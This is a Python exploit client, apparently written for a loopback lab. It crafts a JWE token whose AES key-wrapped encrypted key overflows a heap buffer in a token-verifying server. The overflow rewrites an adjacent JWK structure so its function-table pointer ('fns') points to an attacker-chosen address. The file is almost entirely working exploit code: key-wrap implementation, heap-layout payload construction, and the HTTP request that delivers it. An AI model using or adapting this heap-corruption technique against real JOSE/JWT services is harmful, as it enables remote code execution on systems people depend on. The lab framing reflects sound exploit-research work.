#!/usr/bin/env python3
"""WMARKER wire client: RFC 3394-valid wrap carrying a chosen JWK fns pointer.

Derived from w1/ptr-client.py. The plaintext maps onto heap offsets past the
32-byte CEK: the adjacent JWK's chunk header is preserved, its fields are
copied from the live server's own report, and only fns is replaced by the
fixed -no-pie address of the lab fake function table. One real HTTP GET to a
loopback-only server. No external contact.
"""
import base64
import socket
import struct
import sys

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Lab KEK from w1/client.py (same as the pinned harness).
KEK = bytes.fromhex("dfddb556b3b94eb2ef3d0f8d14b96085")
A6 = b"\xa6" * 8


def b64u(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def wrap(plaintext):
    assert len(plaintext) % 8 == 0 and len(plaintext) >= 16
    n = len(plaintext) // 8
    a = A6
    r = [plaintext[i * 8:(i + 1) * 8] for i in range(n)]
    cipher = Cipher(algorithms.AES(KEK), modes.ECB()).encryptor()
    for j in range(6):
        for i in range(1, n + 1):
            block = cipher.update(a + r[i - 1])
            a = bytes(x ^ y for x, y in zip(block[:8], struct.pack(">Q", n * j + i)))
            r[i - 1] = block[8:]
    return a + b"".join(r)


def token(ek):
    header = b64u(b'{"alg":"A128KW","enc":"A128CBC-HS256"}')
    return ".".join((header, b64u(ek), b64u(b"\x11" * 16),
                     b64u(b"\x22" * 48), b64u(b"\x33" * 32)))


def put(pt, off, val, size):
    pt[off:off + size] = val.to_bytes(size, "little")


def attack_ek(delta, keydata, prev, size, fns):
    pt_len = delta + 48
    pt_len += (-pt_len) % 8
    pt = bytearray(b"\x5a" * pt_len)
    q = delta
    put(pt, q - 16, prev, 8)         # JWK chunk prev_size, preserved
    put(pt, q - 8, size, 8)          # JWK chunk size, preserved
    put(pt, q + 0x00, 3, 4)          # kty = OCT
    put(pt, q + 0x08, 0, 8)          # kid = NULL
    put(pt, q + 0x10, 1, 4)          # retained = 1
    put(pt, q + 0x18, 128, 8)        # keysize = 128 bits
    put(pt, q + 0x20, keydata, 8)    # keydata, preserved
    put(pt, q + 0x28, fns, 8)        # fns -> fake table (only change)
    return wrap(bytes(pt)), pt_len


def main():
    if len(sys.argv) < 5:
        raise SystemExit("usage: client.py HOST PORT MODE DELTA [KEYDATA PREV SIZE FNS]")
    host, port, mode, delta = sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4])
    if mode in ("attack", "fixed"):
        keydata, prev, size, fns = (int(x, 16) for x in sys.argv[5:9])
        ek, pt_len = attack_ek(delta, keydata, prev, size, fns)
    elif mode == "safe":
        ek, pt_len = wrap(b"\x5a" * 32), 32
    else:
        raise SystemExit("BAD_MODE=" + mode)
    tok = token(ek)
    req = ("GET /verify HTTP/1.1\r\nHost: " + host + "\r\nAuthorization: Bearer " +
           tok + "\r\nUser-Agent: wmarker-loopback-consumer\r\nConnection: close\r\n\r\n").encode()
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(req)
        chunks = []
        while True:
            data = s.recv(4096)
            if not data:
                break
            chunks.append(data)
    print("WMARKER_CLIENT MODE=%s PT_LEN=%d TOKEN_LEN=%d EK_RAW_LEN=%d RESPONSE=%r" %
          (mode, pt_len, len(tok), len(ek), b"".join(chunks)[:100]))


if __name__ == "__main__":
    main()
